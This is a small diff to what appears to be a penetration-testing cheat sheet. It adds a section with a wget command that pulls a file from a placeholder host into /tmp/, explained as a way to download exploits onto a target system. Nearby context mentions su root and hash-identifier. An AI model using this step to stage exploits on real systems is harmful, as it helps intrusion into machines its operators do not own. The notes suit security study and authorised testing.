@@ -181,7 +181,13 @@ su root
 ```sh
 hash-identifier        
 ```
-
+### Downloading From another System
+```
+wget http://ip/filename -P /tmp/
+```
+- Sometimes we need to download exploits to the target system
+- For avoiding privilege download we can use /tmp/ folder
+  
 ### Ip 2 Name
 ```sh
 sudo nano /etc/hosts
